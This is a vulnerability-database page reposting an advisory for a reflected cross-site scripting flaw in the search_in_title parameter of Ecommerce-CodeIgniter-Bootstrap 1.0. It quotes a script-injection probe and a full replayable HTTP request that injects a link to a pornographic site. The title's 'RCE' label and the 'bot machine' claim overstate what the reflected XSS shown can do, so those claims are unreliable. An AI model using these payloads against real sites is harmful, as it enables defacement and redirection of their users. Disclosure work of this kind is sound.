---
title: Ecommerce CodeIgniter Bootstrap 1.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022100074
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-01
fetch_date: 2025-10-03T21:22:39.510610
---

# Ecommerce CodeIgniter Bootstrap 1.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ecommerce CodeIgniter Bootstrap 1.0 Cross Site Scripting** **2022.10.31**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: Ecommerce-CodeIgniter-Bootstrap-1.0 Cross-site scripting (reflected) RCE
## Author: nu11secur1ty
## Date: 10.29.2022
## Vendor: https://github.com/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap
## Software: https://github.com/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap/archive/refs/heads/master.zip
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap
## Description:
The value of the search\_in\_title request parameter is copied into the
value of an HTML tag attribute which is encapsulated in double
quotation marks.
The payload f5iun"><script>alert(1)</script>h4s83 was submitted in the
search\_in\_title parameter.
The malicious user can use this vulnerability to exploit every user of
this system to make them a bot machine and etc.
[+] Exploit:
```POST
GET /Ecommerce-CodeIgniter-Bootstrap-master/bg?category=&in\_stock=&search\_in\_title=f5iun"><a%20href="https://pornhub.com/"%20target="\_blank"%20rel="noopener%20nofollow%20ugc">%20<img%20src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG\_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1"%20style="border:1px%20solid%20black;max-width:100%;"%20alt="Photo%20of%20Byron%20Bay,%20one%20of%20Australia%27s%20best%20beaches!">%20</a>h4s83&order\_new=&order\_price=&order\_procurement=&brand\_id=&quantity\_more=203512&added\_after=205226&added\_before=989087&search\_in\_body=167490&price\_from=870466&price\_to=586592&order\_new=&order\_price=&order\_procurement=&brand\_id=&quantity\_more=203512&added\_after=205226&added\_before=989087&search\_in\_body=167490&price\_from=870466&price\_to=586592
HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62
Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: ci\_session=vndq7brjjjf1an7k6s3q913bsqjf03it
Upgrade-Insecure-Requests: 1
Referer: http://pwnedhost.com/Ecommerce-CodeIgniter-Bootstrap-master/bg?category=&in\_stock=&search\_in\_title=&order\_new=&order\_price=&order\_procurement=&brand\_id=&quantity\_more=203512&added\_after=205226&added\_before=989087&search\_in\_body=167490&price\_from=870466&price\_to=586592
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="106", "Chromium";v="106"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```
# Proof and Exploit:
[href](https://streamable.com/y3q67i)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100074)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top